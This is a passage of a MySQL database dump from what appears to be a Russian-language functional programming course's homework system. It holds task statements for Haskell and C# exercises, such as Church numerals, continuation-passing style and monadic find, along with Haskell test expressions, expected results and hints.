(105, 6, 27, 'Описать функцию cartesian, которая для двух списков возвращает список из всех возможных пар элементов из первого и второго списка. Т.е. для списков [x1, x2, x3] и [y1, y2, y3] функция должна вернуть [(x1, y1), (x1, y2), (x1, y3), (x2, y1), (x2, y2), …] (всего 9 пар).\r\n\r\nПри этом желательно использовать только оператор >>= и лямбда выражения. Можно, но не очень нужно, определять вспомогательные функции. \r\n\r\nЕсли не получится сделать задачу с помощью >>=, можно написать любым способом, но только не используя list comprehension (с ним это уж слишком просто).\r\n\r\nПример вызова:\r\n\r\ncartesian [1,2] [3,4]\r\n\r\nДолжно получиться:\r\n[(1,3),(1,4),(2,3),(2,4)]\r\n        \r\n        ', 1),
(106, 1, 28, '**Доп.задача до 2.12*\r\n\r\nОпишите функцию findMajor, которая проверяет, есть ли в списке элемент x, который встречается чаще всех других, вместе взятых, и возвращает Just x или Nothing, если такого элемента нет.\r\n\r\nДополнительное условие: Функция должна работать за линейное время от длины списка, и не должна использовать списки (кроме исходного списка, конечно) или любые другие структуры данных неограниченной длины. Другими словами, должна быть сложность по времени O(n) и сложность по памяти O(1).\r\n\r\nПримеры вызова:\r\n\r\nfindMajor [1,2,3,2,2,2,1]\r\nРезультат должен быть равен Just 2\r\n\r\nfindMajor [1,2,3,2,2,1]\r\nРезультат должен быть равен Nothing\r\n\r\nЗамечания:\r\n- Это просто более-менее известная задачка на сообразительность, с функциональным программированием никак, в общем то, не связанная.\r\n- Я лично знаю решение, которое требует два прохода по списку, и только две вспомогательных переменных\r\n- Интересно, что, если бы задача была найти самое часто встречающееся число, то такое эффективное решение, насколько я понимаю, не существует. \r\nНо раз речь идет не о просто самом частом, а об _очень_ часто встречающемся числе, то все получается гораздо эффективнее.\r\n        \r\n        \r\n        ', 1),
(107, 2, 28, '**Доп.задача до 2.12*\r\n\r\nОпишите тип LogExpr, аналогичный Expr, но для логических выражений. В нем должны быть конструкторы And, Or, Not для логических операций, конструкторы T и F для логических констант и переменная X.\r\n\r\nОпределите для этого типа операцию ==, которая проверяет, эквивалентны ли эти выражения.\r\n\r\nПримеры вызова:\r\n\r\nOr X (Not X) == T\r\nРезультат должен быть равен True\r\n\r\nOr X (And X (Not X)) == T\r\nРезультат должен быть равен False\r\n        ', 1),
(108, 3, 28, '**Доп.задача до 2.12*\r\n\r\nПусть я хочу найти способы расставить ферзей на шахматной доске, чтобы они друг друга не били.\r\n\r\nДля представления позиции на шахматной доске я использую список пар чисел, каждое число >= 1. Первое число обозначает вертикаль, а второе - горизонталь.\r\n\r\nЕще для единообразия давайте считать, что первый ферзь в списке всегда стоит на первой вертикали, второй ферзь - на второй вертикали и т.д. (Т.е., вообще-то хранить вертикали в списке не очень то надо, но для наглядности мы их храним).\r\n\r\nИ вот задача:\r\n\r\nОписать функцию queens с двумя параметрами n и k, которая возвращает список из способов расставить k ферзей на доске с n горизонталями и k вертикалями, чтобы они не били друг друга.\r\n\r\nДополнительное условие: Тут надо обязательно использовать прием "представление множества с помощью функции".\r\n\r\nПример вызова:\r\nqueens 3 2\r\n\r\nДолжно получиться:\r\n[[(1,1),(2,3)],[(1,3),(2,1)]]\r\n\r\n(не обязательно именно в таком порядке).\r\n\r\nЗамечания:\r\n- Мне кажется задача очень похожа на задачу 27-1. Просто в 27-1 функция проверки попроще, а тут посложнее. \r\n- Если не очень понятно о чем речь, но хочется разобраться - пишите, пожалуйста, я подскажу.        \r\n        \r\n        \r\n        ', 1),
(109, 1, 29, '*Доп.задача на C#, до 3.12*\r\n\r\nОписать функцию AllDiffLists с двумя параметрами n и k, которая печатает все последовательности длины k, которые можно составить из чисел 1..n, и в которых все числа разные.\r\n\r\nДополнительное условие: \r\n- В этой задаче нельзя использовать массивы и вообще никакие способы представления данных, кроме целых чисел и лямбда-выражений.\r\n\r\nПример вызова:\r\nallDiffLists 3 2\r\n\r\nДолжно быть напечатано:\r\n 1 2\r\n 1 3\r\n 2 1\r\n\r\n... и т.д., всего 6 строчек(не обязательно именно в таком порядке).\r\n\r\nЗамечания:\r\n\r\n- Я бы предложил тут использовать прием "представление множества с помощью функции".\r\n\r\n- Но этого мало, потому что нам еще надо как-то хранить числа, которые мы уже отобрали, чтобы потом из напечатать. \r\n\r\nТут я бы предложил использовать еще одну функцию, которая при рекурсивных вызовах становится сложнее и сложнее. Но эта функция будет накапливать не проверки, а _печать_ для отобранных чисел.\r\n\r\n- Техническое замечание: Функция без параметров, которая ничего не возвращает, описывается так:\r\n\r\nAction f\r\n\r\nИ вот примеры лямбда выражений, у которых нет параметров, и которые ничего не возвращают:\r\n\r\n() => { Console.WriteLine(); }\r\n() => { f(); g(); } \r\n        ', 1),
(110, 2, 29, '*Доп. задача на C#, до 3.12*\r\n\r\na. Написать на C# функцию Find, которая в данном массиве целых чисел ищет элемент, удовлетворяющий данному логическому условию. При этом функция должна использовать failure continuation, чтобы обрабатывать случай, когда ничего не найден.\r\n\r\nб. Привести пример, как с помощью Find можно решить пример с занятий: \r\n"Найти в массиве число <10, а если его нет, найти число <20, а если и его нет, вернуть 20".\r\n\r\nТехнические замечания про failure continuation на C# см. тут: \r\nhttp://msimuni.wikidot.com/fp-failure-continuation \r\n\r\nЗамечания:\r\n- Если хотите, можете решить задачу для List<int> или вообще для IEnumerable<int> - как вам удобнее.\r\n- Можете, если хотите, попробовать решить эту задачу на C++ или Java.\r\n- Эта задача, на самом деле, очень простая, надо только понять, о чем вообще речь. \r\n        ', 1),
(111, 1, 30, 'а. Описать тип Expr, позволяющий задавать выражения с несколькими переменными. Тип должен позволять задать, например, такое выражение:\r\n\r\nAdd (Var "x") (Mult (Var "y") (N 3))\r\n\r\n(И это должно соответствовать x+y*3 в обычном языке.) \r\n\r\nб. Описать функцию eval для таких выражений. Ее второй параметр должен быть списком пар (имя переменной, значение переменной).\r\n\r\nПример вызова:\r\n\r\neval (Add (Var "x") (Mult (Var "y") (N 3))) [("x", 5), ("y", 8)]\r\n\r\nРезультат должен быть равен 29\r\n\r\nЗамечание:\r\n- Не очень понятно что делать, если для какой-то переменной значение не задано. Вы можете задать любое поведение в этом случае, или вообще не рассматривать такой случай. В тестах такого не будет.\r\n        ', 1),
(112, 2, 30, 'а. К типу Expr из задачи 30-1, добавить еще возможность описывать что-то похожее на let выражения. Вот пример такого выражения\r\n\r\nAdd (Let "x" 10 (Mult (Var "x") (Var "y"))) (N 1)\r\n\r\n(И это должно соответствовать (let x = 10 in x*y) + 1 в обычном языке.) \r\n\r\nб. Дописать функцию eval из задачи 30-1, чтобы она вычисляла let выражения. \r\n\r\nПример вызова:\r\n\r\neval Add (Let "x" 10 (Mult (Var "x") (Var "y"))) (N 1) [("y", 2)]\r\n\r\nРезультат должен быть равен 21', 1),
(113, 3, 30, 'Опишите функцию sum_cps которая ищет сумму элементов данного списка, используя continuation-passing style.\r\n\r\nПримеры вызова:\r\n\r\nsum_cps [1,2,3] id \r\nРезультат дб равен 6\r\n\r\nsum_cps [1,2,3] (^2)\r\nРезультат дб равен (1+2+3)^2=36\r\n\r\nДополнительные условия:\r\n- Нельзя определять никакие новые функции, кроме sum_cps.\r\n- Нельзя использовать никакие стандартные функции для работы со списками.\r\n- Определение sum_cps должно быть tail recursive\r\n(Эти все условия следуют из того что функция должна  использовать continuation passing style, я их выписал просто для тех, кто мб не был на занятии).  \r\n        ', 1),
(114, 4, 30, '*Простое упражнение на использование >>= и do нотации*\r\n\r\nОпишите две функции triangle1 и triangle2. Обе должны для данного n возвращать список:\r\n\r\n[1, \r\n 1, 2, \r\n 1, 2, 3,\r\n  ...\r\n 1, 2, 3, ..., n]\r\n\r\nДополнительные условия:\r\n- triangle1 надо написать с помощью оператора >>= и функции return\r\n- triangle2 надо написать с помощью do нотации\r\n\r\nПримеры вызова:\r\n\r\ntriangle1 3\r\ntriangle2 3\r\n\r\nВ обоих случаях должно получиться:\r\n[1,1,2,1,2,3] ', 1);
INSERT INTO `task` (`TaskID`, `TaskForHometask`, `HometaskID`, `Condition`, `Price`) VALUES
(115, 5, 30, 'Пусть функция find описана так:\r\n\r\nfind cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\n(Т.е. для того, чтобы сообщить о том, что ничего не найдено, мы используем пустой список).\r\n\r\nС помощью этого варианта find описать функцию f, которая делает вот что:\r\nВ данном списке f ищет:\r\n- первое число, меньшее 5\r\n- первое число, большее 10\r\n- первое число, не равное 7\r\nи возвращает:\r\n- если хотя бы один поиск был неудачным, возвращает []\r\n- если все числа найдены, возвращает список из одного элемента - их суммы.\r\n\r\nПримеры вызова:\r\n\r\nf [7, 6, 4, 3, 20, 15, 9] \r\nРезультат должен быть равен [30], потому что первое < 5 - это 4, первое > 10 - это 20 и первое /= 7 - это 6 и их сумма равна 30\r\n\r\nf [7, 6, 4, 3, 9]\r\nРезультат должен быть равен [], потому что один из трех поисков ничего не находит.\r\n\r\nЗамечания: \r\n- Это просто упражнение, на то, как удобнее работать с несколькими вызовами функции, которая может завершиться неудачно. (К сожалению, забыл обсудить ее на занятии).\r\n- Задачу можно решить очень коротко, в одну строку.  \r\n- Если коротко не получиться, вы можете присылать любое решение.\r\n        \r\n        ', 1),
(116, 6, 30, 'Написать функцию toInt, которая по данному числу Черча возвращает обычное число.\r\n\r\nПример вызова:\r\n\r\ntoInt (f x -> f (f (f x)))\r\n\r\nРезультат должен быть равен 3.\r\n\r\nЗамечание: \r\n- Задача очень простая, пишется в одну строку.\r\n- В условии еще должна быть, конечно, обратная наклонная черта, но, к сожалению система тестирования по прежнему не умеет ее выводить (( \r\n        \r\n        ', 1),
(117, 7, 30, 'Написать функцию inc, которая прибавляет 1 к числу Черча.\r\n\r\nНапример, вызов inc (f x -> f (f (f x))) должен вернуть f x -> f (f (f (f x))). \r\n\r\nПример вызова:\r\ntoInt (inc (f x -> f (f (f x))))\r\nРезультат д.б. равен 4.\r\n\r\nЗамечание: \r\n- Это тоже очень простая задача.\r\n- И тут тоже в условии должна быть обратная наклонная черта, но система тестирования не умеет ее выводить..\r\n\r\n        ', 1),
(118, 8, 30, 'Пусть мы описали функцию find вот так:\r\n\r\nfind cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n(В этом задании мы не думаем о том, что будет, если мы ничего не найдем. Тут мы считаем, что всегда все находим).\r\n\r\nТ.е. у нас есть функции, которые возвращают пару из какого-то значения и хвоста списка. Мы бы хотели написать оператор, немного похожий на оператор композиции (.), Но только чтобы он сначала вызывал одну функцию, а потом вторую функцию вызывал для хвоста, полученного в результате первого вызова.\r\n\r\nЗадача: Определить такой оператор, назовем его >>>, чтобы можно было писать так:\r\n\r\nf = find (>3) >>> find (>3)  \r\n-- f - это функция, которая ищет в списке второй элемент, больший 3.\r\nf  [1, 3, 5, 2, 20, 25, 2]\r\n-- Должно получиться (20, [25, 2])\r\n        ', 1),
(119, 1, 31, '*Доп.задача, до 9.12*\r\n\r\nРеализовать функцию dec, которая вычитает 1 из числа Черча.\r\n\r\nПример вызова: \r\ndec (f x -> f (f (f x))) \r\nдолжен вернуть f x -> f (f x). \r\n\r\nДля проверки имеет смысл вызвать так:\r\ntoInt (dec (f x -> f (f (f x)))) \r\nи ответ д.б. равен 2.\r\n\r\nЗамечания:\r\n- Как обычно, в условии не хватает расставленных в нужном месте символов обратной косой черты.\r\n- Имеется в виду, что в этой задаче нельзя использовать встроенные функции и вообще нельзя использовать настоящие целые числа (потому что глобальная задача - показать, что встроенные целые числа теоретически не очень нужны, их можно моделировать). Например, нельзя перевести число Черча в обычное, вычесть 1 и перевести обратно.\r\n- *Дополнение к первоначальному условию*. Кроме этого, давайте считать, что никакие структуры данных (списки, пары) использовать нельзя. Мы же ставим себя на место Черча и Клини у которыъ были только лямбда выражения, и больше ничего.\r\n- Эта задача не очень простая. Сам Черч не смог ее решить, ему помог его студент (С.Клини). Так что если у вас не получится, не расстраивайтесь:)\r\n- Вы, безусловно, можете найти решение этой задачи в сети. Это не запрещается, но имейте в виду, что тех, кто сдал эту задачу я могу на зачете попросить ее воспроизвести или обьяснить.\r\n        \r\n        ', 1),
(120, 2, 31, '*Доп.задача, до 9.12*\r\n\r\nПусть нас интересуют формулы исчисления высказываний, которые можно составить из переменных и символа следования ->. Вот примеры таких формул:\r\n\r\nA -> A\r\n(A -> B) -> ((B -> C) -> (A -> C))\r\n(A -> B) -> (B -> A)\r\n((A -> B) -> C) -> D\r\n\r\nа. Описать тип данных (data) позволяющий описывать такие формулы (примерно так же, как с помощью Expr мы описывали арифметические формулы).\r\n\r\nб. Написать функцию isTautology, которая по данной формуле определяет, является ли она тавтологией, т.е. верно ли, что она истина при любых значениях входящих в нее переменных, и возвращает True или False. Например, их приведенных выше формул первая и вторая - это тавтологии, а остальные - нет.\r\n\r\nЗамечания:\r\n- Тестов к этой задаче в системе нет, потому что я не знаю, какое представление данных вы выберете. \r\n        \r\n        ', 1),
(121, 1, 32, '*Доп. задача на C# - до 10.12*\r\n\r\nВ этот раз задача наверное не очень полезная и не очень осмысленная:( Ну, рассматривайте ее, пожалуйста, просто как техническое упражнение (и как возможность заработать баллы:)\r\n\r\nЗадание простое: написать функцию fact_cps, которая вычисляет факториал, с использованием рекурсии и continuation apssing style. Ну и привести пример вызова - ввести целое число и, с помощью вызова fact_cps напечатать результат.\r\n\r\nТ.е., фактически, надо просто переписать пример с занятий на C# (или, если хотите, на любой другой `обычный` язык программирования).\r\n        ', 1),
(122, 1, 33, 'а. Добавить в тип Expr конструкции, позволяющие определять свои функции и вызывать их. Для простоты мы рассматриваем только функции с одним параметром, параметр и результат функции - целые числа.\r\nб. Добавить в функцию eval реализацию для этих конструкций.\r\n\r\nПример вызова:\r\n\r\neval (LetFunc "F" "X" (Mult (Var "X") (Var "X")) (Add (Num 1) (Call "F" (Num 5)))) [] []\r\n\r\nДолжно получиться 26, потому что мы тут записали на нашем языке выражение:\r\nlet f x = x*x in 1 + f 5\r\n\r\nЗамечания:\r\n- Задача не очень простая, но, в общем то, тут надо придумать представление данных (как хранить функции) и дальше все, в общем, не сложно.\r\n- Я бы предложил завести отдельный параметр - список для хранения функций. Поэтому в примере вызова у меня в конце два пустых списка - для переменных и для функций. Но, если хотите, можете немного изменить список для хранения значений переменных, чтобы в нем можно было хранить и функции. Тесты тогда не пройдут, ну и ладно, я так проверю. \r\n- Можно считать, что не надо поддерживать замыкания (т.е. в функциях не используются нелокальные переменные).\r\n        \r\n        ', 1),
(123, 2, 33, 'а. Описать функцию find с двумя параметрами - условие (логическая функция) и список. Функция должна искать первый элемент в списка, удовлетворяющий условию, и возвращать Just элемент или Nothing, если ничего не найдено. \r\n\r\nПримеры вызова find:\r\n\r\nfind (>6) [1, 2, 8, 3]\r\nРезультат должен быть Just 8\r\n\r\nfind (>6) [1, 2, 5, 3]\r\nРезультат должен быть Nothing\r\n\r\nб. С помощью этого варианта find описать функцию f, которая делает вот что:\r\nВ данном списке f ищет:\r\n- первое число, меньшее 5\r\n- первое число, большее 10\r\n- первое число, не равное 7\r\nи возвращает:\r\n- если хотя бы один поиск был неудачным, возвращает Nothing\r\n- если все числа найдены, возвращает Just для их суммы.\r\n\r\nДополнительное условие:\r\nОбязательно надо использовать конструкцию do (как это можно сделать, мы обсуждали на последнем занятии).\r\n\r\nПримеры вызова:\r\n\r\nf [7, 6, 4, 3, 20, 15, 9] \r\nРезультат должен быть равен Just 30, потому что первое < 5 - это 4, первое > 10 - это 20 и первое /= 7 - это 6 и их сумма равна 30\r\n\r\nf [7, 6, 4, 3, 9]\r\nРезультат должен быть равен Nothing, потому что один из трех поисков ничего не находит.\r\n\r\nЗамечание: \r\n- Это очень, очень простое упражнение, абсолютно все решение есть в конспекте.. Просто балл в подарок :)\r\n        \r\n        ', 1),
(124, 3, 33, 'Описать функцию downUp, которая для данного параметра n печатает числа:\r\nn n-1 n-2 … 3 2 1 2 3 … n-2 n-1 n\r\nпо одному в столбик.\r\n\r\nДополнительное условие:\r\n- Надо обязательно использовать функцию print и do нотацию\r\n\r\nПример вызова:\r\n\r\ndownUp 3\r\n\r\nДолжно напечататься:\r\n3\r\n2\r\n1\r\n2\r\n3\r\n        ', 1),
(125, 4, 33, 'Я сказал на занятии примерно следующее:\r\nВыражение\r\n(x -> E) a\r\nвсегда можно без изменения смысла выражения заменить на Е в котором все вхождения x заменены на a\r\n\r\nНапример,\r\n(x->x*x)5\r\nэто то же, что\r\n5*5\r\n\r\nНа самом деле я немного ошибся. Для более сложных выражений это правило не всегда верно, его надо как-то уточнить.\r\n\r\nа. Приведите пример, когда это не так\r\nб. Напишите, как сформулировать правило бета редукции более корректно.\r\n\r\nЗамечания:\r\n- Это не задача на программирование. Ответом д.б. текст, что-то вроде: "Вот пример, когда ваше правило дает неправильные результаты: … какой-то пример … . Его можно исправить так: … правильная формулировка … .\r\n- На самом деле в определении две ошибки, вы можете указать любую.\r\n- Одна из ошибок совсем очевидная (да и вторая, в общем-то, то же), и то, что требуется указать, как исправление, может быть кажется вам само собой разумеющимся. Т.е., если вы придумали ответ на эту задачу, но он кажется вам слишком простым - выкладывайте его в систему, очень может быть это как раз то, что имеется в виду.\r\n        ', 1),
(126, 5, 33, 'Черч и Россер доказали теорему: бета-редукция для лямбда исчисления обладает свойством конфлюентности.\r\n\r\nИспользуя эту теорему, докажите, что если для лямбда выражения существует нормальная форма, то она единственна.\r\n \r\nЗамечания:\r\n- Тут, понятно, надо написать текст, а именно доказательство этого утверждение, более-менее строгое.\r\n- Это, на самом деле очень простое следствие, практически очевидное. М.б. в этом некоторая трудность, бывает не так просто доказать, что одно следует из другого, если это очевидно. Но вы попробуйте:)\r\n        ', 1),
(127, 6, 33, 'У функции >>>, мы которую мы описали на последнем занятии, есть принципиальный недостаток - она никак не использует результат, найденный первой функцией - только хвост. \r\n\r\nВ результате, такие задачи, например с ее помощью записать не удастся:\r\n- Найти в списке элемент x, больший 3, а потом первый элемент, больший x.\r\nили\r\n- Найти в списке элемент x, больший 3, а потом первый элемент y, меньший x, а потом первый элемент, не равный сумме x и у\r\n\r\nКакую бы написать функцию, чтобы решить эту проблему?\r\n\r\nОпишите какой-то оператор, который как-то дозволяет это делать.\r\n\r\nПримера вызова не будет, потому что оператор вы должны придумать сами, но по идее что-то такое\r\n\r\nf = find (>3) ... какие-то заклинания ... find (>x) \r\n\r\nИ потом:\r\nf [1,6,5,7,1,2]\r\nдолжно вернуться (7, [1,2])\r\n\r\nЗамечания:\r\n- На занятии мы еще говорили про функцию, которая возвращает сумму двух найденных чисел, но про это давайте мы решим задачу в следующий раз.\r\n- Ответ очень короткий (почти не длиннее чем решение для >>>), надо только понять, что бы тут хотелось иметь.\r\n- Подсказка: я бы назвал нужную нам функцию >>>=. (Я бы еще лучше назвал ее >>=, но тут есть некоторые технические сложности, с которыми неохота разбираться..)\r\n- Если вам не придумать решение, напоминающее >>=, вы можете предложить любое другое. Все что угодно, только не списывайте:) Все, что будет немного похоже на решение, я зачту:)\r\n- Если совсем непонятно о чем речь, вы можете написать мне, и я немного подскажу.\r\n        \r\n        ', 1);

-- --------------------------------------------------------

--
-- Структура таблицы `test`
--

CREATE TABLE IF NOT EXISTS `test` (
  `TestID` int(11) NOT NULL AUTO_INCREMENT,
  `Expression` varchar(100) DEFAULT NULL,
  `Result` varchar(255) DEFAULT NULL,
  `TaskID` int(11) DEFAULT NULL,
  `Smart` int(11) NOT NULL DEFAULT '0',
  `TestForTaskID` int(11) NOT NULL,
  `SmartHelp` varchar(300) DEFAULT NULL,
  PRIMARY KEY (`TestID`),
  UNIQUE KEY `TestForTaskID` (`TestForTaskID`,`TaskID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=249 ;

--
-- Дамп данных таблицы `test`
--

INSERT INTO `test` (`TestID`, `Expression`, `Result`, `TaskID`, `Smart`, `TestForTaskID`, `SmartHelp`) VALUES
(31, 'f 1', '2', 18, 0, 1, ''),
(35, 'g 6', 'False', 22, 0, 1, ''),
(36, 'g 7', 'True', 22, 0, 2, ''),
(37, 'let phi = f 100 in (phi > 1.618) && (phi < 1.619)', 'True', 18, 1, 2, 'При больших f получается замечательное число (первое описание - Евклид, примерно 300 г. до н.э.)'),
(38, 'b 3', '0.7', 24, 0, 1, ''),
(39, 'let res = b 100 in res > 0.69777 && res < 0.69778', 'True', 24, 1, 2, 'При больших n должно получаться примерно 0.697'),
(40, 'sumsin 1', '1', 19, 0, 1, ''),
(41, 'let { x = sumsin 3; y = sin 6 / (sin 1 + sin 2 + sin 3) } in abs(x - y) < 0.001', 'True', 19, 1, 2, 'Для 3 что-то не так '),
(42, 'sumfact 1', '1', 20, 0, 1, ''),
(43, 'sumfact 2', '3', 20, 0, 2, ''),
(44, 'sumfact 3', '9', 20, 1, 3, 'В условии же приведен пример вызова :( '),
(45, 'sumfact 4', '33', 20, 0, 4, ''),
(46, 'nseq 1', '1', 21, 0, 1, ''),
(47, 'nseq 2', '1', 21, 0, 2, ''),
(48, 'nseq 3', '2', 21, 0, 3, ''),
(49, 'nseq 9', '8', 21, 0, 4, ''),
(50, 'g 40', 'True', 22, 0, 3, ''),
(51, 'g 1000', 'True', 22, 0, 4, ''),
(52, 'g 3', 'False', 22, 1, 5, '1 - это не простое число'),
(53, 'g 11', 'False', 22, 0, 6, ''),
(54, 'c 10', '6', 23, 0, 1, ''),
(55, 'c 3', '2', 23, 0, 2, ''),
(56, 'minlist [3,2,7]', '2', 25, 0, 1, ''),
(57, 'minsum [1,8,3,2,7]', '5', 27, 0, 1, ''),
(58, 'check (\\ x->x>5) [3,2,7,4]', 'True', 28, 0, 1, ''),
(59, 'check (\\x->x>5) [3,2,1,4]', 'False', 28, 0, 2, ''),
(60, 'check (\\x->x>5) []', 'False', 28, 1, 3, 'Как вы думаете, что правильно будет вернуть, если список пустой?'),
(61, 'checkDifferent [3,2,7]', 'True', 29, 0, 1, ''),
(62, 'checkDifferent [3,2,7,5,2,8]', 'False', 29, 0, 2, ''),
(63, 'c 9', '5', 23, 0, 3, ''),
(64, 'c 20', '22', 23, 0, 4, ''),
(65, 'rev [1,2,3] == [3,2,1]', 'True', 26, 0, 1, ''),
(66, 'rev [1]', '[1]', 26, 0, 2, ''),
(67, 'rev []', '[]', 26, 0, 3, ''),
(68, 'parts [1, 2, 8, 2, 5, 6]', 'True', 30, 0, 1, ''),
(69, 'parts [1, 2, 3, 4, 5]', 'True', 30, 0, 2, ''),
(70, 'parts [1, 2, 1, 2, 3, 4]', 'True', 30, 0, 3, ''),
(71, 'parts [4, 6, 3, 5, 7]', 'False', 30, 0, 4, ''),
(72, 'parts [1, 2, 3, 4, 1, 2, 3, 4, 5, 6]', 'True', 30, 1, 5, 'Длина, о которой идет речь в условии, это вовсе не обязательно длина самого короткого куска, она может быть и короче. '),
(73, 'parts2 [1, 3, 1, 8, 4, 9]', 'True', 31, 0, 1, ''),
(74, 'parts2 [1, 2, 3, 5, 1, 7]', 'False', 31, 0, 2, ''),
(75, 'parts2 [1, 1]', 'True', 31, 0, 3, ''),
(76, 'parts [1, 2, 3, 4, 5, 6, 1, 2, 3, 4]', 'True', 30, 0, 6, ''),
(77, 'isosc (0, 2) (2, 0) (2,2)', 'True', 35, 0, 1, ''),
(78, 'isosc (0, 2) (2,2) (2, 0)', 'True', 35, 0, 2, ''),
(79, 'isosc (2,2) (0, 2) (2, 0)', 'True', 35, 0, 3, ''),
(80, 'isosc (0, 0) (10, 10) (10, -10)', 'True', 35, 0, 4, ''),
(81, 'isosc (-3, 2) (2, 0) (2,2)', 'False', 35, 0, 5, ''),
(82, 'cubeTable 4', '[(1,1),(2,8),(3,27),(4,64)]', 36, 0, 1, ''),
(83, 'minsum [1,8,3,2,7] ', '5', 37, 0, 1, ''),
(84, 'minsum [1,1]', '2', 37, 0, 2, ''),
(85, 'height (Node 1 Empty Empty)', '0', 38, 0, 1, ''),
(86, 'height (Node 1 (Node 1 Empty Empty) Empty)', '1', 38, 0, 2, ''),
(87, 'height (Node 1 (Node 2 Empty (Node 3 Empty Empty)) Empty)', '2', 38, 0, 3, ''),
(88, 'minHeight (Node 1 Empty Empty)', '0', 39, 0, 1, ''),
(89, 'minHeight (Node 1  (Node 2  (Node 3 Empty Empty) Empty) (Node 4 Empty Empty))', '1', 39, 0, 2, ''),
(90, 'frame 4', '[[1,1,1,1],[1,0,0,1],[1,0,0,1],[1,1,1,1]]', 40, 0, 1, ''),
(91, 'frame 2', '[[1,1],[1,1]]', 40, 0, 2, ''),
(92, 'countOdd [2, 3, 4, 8, 5, 33, 9]', '4', 41, 0, 1, ''),
(93, 'countOdd1 [2, 3, 4, 8, 5, 33, 9]', '4', 41, 0, 2, ''),
(94, 'countOdd []', '0', 41, 1, 3, 'А если список пустой?'),
(95, 'countOdd1 []', '0', 41, 1, 4, 'А если список пустой?'),
(96, 'myfoldl (+) 0 [1,2,3]', '6', 42, 0, 1, ''),
(97, 'myfoldl (+) 10 []', '10', 42, 0, 2, ''),
(98, 'myfoldl (^) 2 [3]', '8', 42, 0, 3, ''),
(99, 'let f x y = 2*x+y in myfoldl f 2 [3,5]', '19', 42, 0, 4, ''),
(100, 'minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))', '2', 39, 0, 3, ''),
(101, 'parts2 [1,6,9,7]', 'True', 31, 0, 4, ''),
(102, 'parts2 [2,1]', 'True', 31, 0, 5, ''),
(103, 'parts2 [1,6,9]', 'False', 31, 0, 6, ''),
(104, 'let (x,y) = euclid 3 5 in 3*x+5*y', '1', 43, 0, 1, ''),
(105, 'let (x,y) = euclid 1 0 in 1*x+0*y', '1', 43, 0, 2, ''),
(106, 'let (x,y) = euclid 33 25 in 33*x+25*y', '1', 43, 0, 3, ''),
(107, 'let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)', '(6,14)', 44, 0, 1, ''),
(109, 'let [x,y,z] = dioph [1,1,1,1] [2,2,2,2] in x+y+z', '1', 44, 0, 2, ''),
(110, 'let [x,y,z] = dioph [1,0,1,2] [0,1,0,0] in (x+z, y)', '(2,0)', 44, 0, 3, ''),
(111, 'let [x,y,z] = dioph [25,33,0,1] [1,0,1,0] in (25*x+33*y, x+z)', '(1,0)', 44, 0, 4, ''),
(112, 'let [x,y,z] = dioph [0,0,0,0] [0,1,0,3] in y', '3', 44, 0, 5, ''),
(113, 'let [x,y,z] = dioph [7,11,0,1] [0,25,19,1] in (7*x+11*y, 25*y+19*z)', '(1,1)', 44, 0, 6, ''),
(114, 'parts2 [4,3,2,1]', 'False', 31, 0, 7, ''),
(115, 'let [x,y,z] = dioph [0,1,0,0] [1,1,0,10] in (y,x+y)', '(0,10)', 44, 0, 7, ''),
(116, 'minHeight (Node 1 Empty (Node 2 Empty Empty)) ', '1', 39, 0, 4, ''),
(117, 'minHeight (Node 1 (Node 2 (Node 3 Empty Empty) Empty) Empty)', '2', 39, 0, 5, ''),
(118, 'parts2 [5,1, 2,3, 7,8, 9,10, 11,12, 13,6, 20,14,15,16,17,18]', 'True', 31, 0, 8, ''),
(119, 'parts2 [5,1,2,3, 7,8,9,10,11,12,13,6,20,14,15,16]', 'False', 31, 0, 9, ''),
(120, 'myreverse [1,2,3,4]', '[4,3,2,1]', 48, 0, 1, ''),
(121, 'length (powerset [1,2,3])', '8', 47, 0, 1, ''),
(122, 'powerset []', '[[]]', 47, 0, 2, ''),
(123, 'myreverse [1,2,3]', '[3,2,1]', 48, 0, 2, ''),
(124, 'elem [1,3] (powerset [1,2,3])', 'True', 47, 0, 3, ''),
(125, 'elem [3,1] (powerset [1,2,3])', 'False', 47, 1, 4, 'Элементы в подсписках из powerset должны идти в том же порядке, что и в исходном списке.'),
(126, 'minsum [2,9,1,3]', '4', 37, 0, 3, ''),
(127, 'isosc (0,5) (3,4) (5,0)', 'False', 35, 0, 6, ''),
(128, '(repeatFunc (*2) 3) 1', '8', 51, 0, 1, ''),
(129, 'repeatFunc id 10 1', '1', 51, 0, 2, ''),
(130, 'repeatFunc (*2) 3 10', '80', 52, 0, 1, ''),
(131, 'coins 2', '[[1,0,0]]', 53, 0, 1, ''),
(132, 'length (coins 10)', '4', 53, 0, 2, ''),
(133, 'elem [1,1,1] (coins 10)', 'True', 53, 0, 3, ''),
(134, 'allLists 1 1', '[[1]]', 56, 0, 1, ''),
(135, 'length (allLists 3 3)', '27', 56, 0, 2, ''),
(136, 'elem [3,2,3] (allLists 3 3)', 'True', 56, 0, 3, ''),
(137, 'canMakeScheme [4,4,5] 7', 'True', 57, 0, 1, ''),
(138, 'canMakeScheme [4,4,5] 1', 'False', 57, 0, 2, ''),
(139, 'canMakeScheme [13, 7, 2, 3] 6', 'True', 57, 0, 3, ''),
(140, 'sumDiv 10', '8', 61, 0, 1, ''),
(141, 'perfects 100', '[6,28]', 61, 0, 2, ''),
(142, 'amicables 300', '[(220,284)]', 62, 0, 1, ''),
(143, 'take 4 fives', '[5,55,555,5555]', 63, 0, 1, ''),
(144, 'canMakeScheme [13, 7, 2, 3] 7', 'True', 57, 0, 4, ''),
(145, 'canMakeScheme [50,13,2,3,7] 56', 'True', 57, 0, 5, ''),
(146, 'canMakeScheme [13,10, 2, 1000, 1000] 506', 'True', 57, 0, 6, ''),
(147, 'length(filter(==(3,2))(take 100 cantor))', '1', 65, 0, 1, ''),
(148, 'length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))', '1', 66, 0, 1, ''),
(149, 'length[x|(x,y)<-take 100 cantor, x<=0||y<=0]', '0', 65, 0, 2, ''),
(150, '(bigSin 0.99) < 0.991', 'True', 69, 0, 1, ''),
(151, 'myFilter (>0) [1,-2,3,-5]', '[1,3]', 70, 0, 1, ''),
(152, 'z>1.64 && z<1.65', 'True', 71, 0, 1, ''),
